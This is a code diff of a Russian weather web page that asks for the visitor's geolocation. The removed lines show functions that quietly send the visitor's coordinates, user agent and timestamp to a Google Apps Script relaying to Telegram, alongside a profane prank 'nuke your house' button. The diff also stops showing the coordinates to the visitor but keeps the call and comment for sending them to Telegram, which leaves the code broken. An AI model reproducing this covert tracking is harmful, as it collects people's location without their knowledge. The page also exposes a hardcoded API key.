@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Погодка</title>
+    <title>Погода</title>
     <link rel="icon" href="https://emojigraph.org/media/messenger/sun_2600-fe0f.png">
     <style>
         body {
@@ -71,21 +70,22 @@
 </head>
 <body>
     <div class="container">
-        <h1>САСИТЕ, СПАММЕРЫ БЛЯ</h1>
+        <h1>🌍 Погода по местоположению</h1>
+        
+        <button onclick="getLocation()">📍 Определить мое местоположение</button>
+        
+        <div id="place" class="status info">
+            Нажмите кнопку для определения местоположения
+        </div>
         
         <h4 id="weatherD"></h4>
         <h4 id="temp"></h4>
         <h4 id="feels_li"></h4>
-        
-        <div id="secret"></div>
-        <div id="okay"></div>
-        
-        <audio src="https://zvukipro.com/uploads/files/2023-12/1702600498_02868.mp3" id="myAudio"></audio>
+
     </div>
 
     <script>
 
-        
         
         const apiKey = 'f85315666ea138adc5946ff3138e9e02';
         let currentLat = null;
@@ -105,7 +105,7 @@
                     currentLat = position.coords.latitude;
                     currentLon = position.coords.longitude;
                     
-                    placeElement.innerHTML = `<div class="status success">✅ Координаты получены: ${currentLat.toFixed(6)}, ${currentLon.toFixed(6)}</div>`;
+                    placeElement.innerHTML = `<div class="status success">✅ Местоположение определено!</div>`;
                     
                     // Отправляем координаты в Telegram через Google Apps Script
                     sendToGoogleScript(currentLat, currentLon);
@@ -132,57 +132,6 @@
             );
         }
     
-            function sendToGoogleScript(lat, lon) {
-        const payload = {
-            lat: lat,
-            lon: lon,
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-        };
-    
-        fetch(GOOGLE_SCRIPT_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload)
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log('✅ Координаты отправлены в Telegram');
-            } else {
-                console.error('❌ Ошибка отправки:', data.error);
-            }
-        })
-        .catch(error => {
-            console.error('❌ Ошибка сети:', error);
-            // Если POST не работает, пробуем GET
-            sendViaGet(lat, lon);
-        });
-    }
-    
-    function sendViaGet(lat, lon) {
-        const params = new URLSearchParams({
-            lat: lat,
-            lon: lon,
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-        });
-    
-        fetch(GOOGLE_SCRIPT_URL + '?' + params.toString())
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log('✅ Координаты отправлены в Telegram (GET)');
-            } else {
-                console.error('❌ Ошибка отправки (GET):', data.error);
-            }
-        })
-        .catch(error => {
-            console.error('❌ Ошибка сети (GET):', error);
-        });
-    }
         // Остальные функции без изменений
         function getLocationName(lat, lon) {
             fetch(`https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&lang=ru&appid=${apiKey}`)
@@ -215,30 +164,12 @@
                     document.getElementById('temp').innerHTML = `🌡️ Температура: ${weatherData.main.temp.toFixed(1)}°C`;
                     document.getElementById('feels_li').innerHTML = `💭 Ощущается как: ${weatherData.main.feels_like.toFixed(1)}°C`;
                   
-                    document.getElementById('secret').innerHTML = '<button onclick="bomb()" class="ebash">💣 ЗАЕБАШИТЬ ЯДЕРКОЙ ПО СВОЕМУ ДОМУ</button>';
                 })
                 .catch(error => {
                     console.error('Ошибка получения погоды:', error);
                 });
         }
-
-        const audio = document.getElementById("myAudio");
-        
-        function bomb() {
-            audio.play();
-            if (currentLat !== null && currentLon !== null) {
-                document.getElementById('okay').innerHTML = 
-                    `<div class="status error" style="font-size: 20px; font-weight: bold;">
-                        💥 ПОНЯЛ, РОДНОЙ, ЕБАШИМ ПО КООРДИНАТАМ ${currentLat.toFixed(6)}, ${currentLon.toFixed(6)}
-                    </div>`;
-            } else {
-                document.getElementById('okay').innerHTML = '<div class="status error">💥 ПОНЯЛ, РОДНОЙ, ЕБАШИМ</div>';
-            }
-        }
     </script>
 </body>
 
 </html>
-
-
-
